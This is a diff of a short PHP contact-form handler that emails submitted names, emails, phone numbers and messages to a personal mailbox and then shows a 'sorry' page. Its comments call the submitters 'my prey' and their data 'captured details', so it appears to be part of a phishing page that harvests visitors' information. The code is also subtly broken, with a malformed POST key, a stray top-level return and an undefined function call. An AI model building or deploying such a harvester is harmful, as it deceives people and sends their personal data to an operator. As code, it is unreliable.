@@ -1,7 +1,6 @@
 <?Php 
-include '../includes/head.php';
 
-        //creating the variables for the contact
+        //creating the variables for the contact submission
 if (isset($_POST['submit'])) {
     $name = trim($_POST['name' ." - ". 'second']);
     $email = trim($_POST['email']);
@@ -9,8 +8,8 @@ if (isset($_POST['submit'])) {
     $message = trim($_POST['message']);
 
 
-    //needed details (For the location of my prey's details), also making it more readable for me
-    $myMail = "praisep359@gmail.com";
+    //needed details (For the location of where the captured details is heading to), also making it more readable for me
+    $myMail = "praisebuka@proton.me";
     $header = "From: " . $email;
     $message2 = "You have a new message from " . $name . "<br> whose phone number
     is ". $phone ."\n\n" . $message;
@@ -21,10 +20,10 @@ if (isset($_POST['submit'])) {
     //............The subject
     //............The message
     mail($myMail, $subject, $message2);
-    return view('sorry');
+    return ('../sorry.html');
     
 } else {
-    echo  trying($views);
+    return ('../sorry.html');
 }
 
 
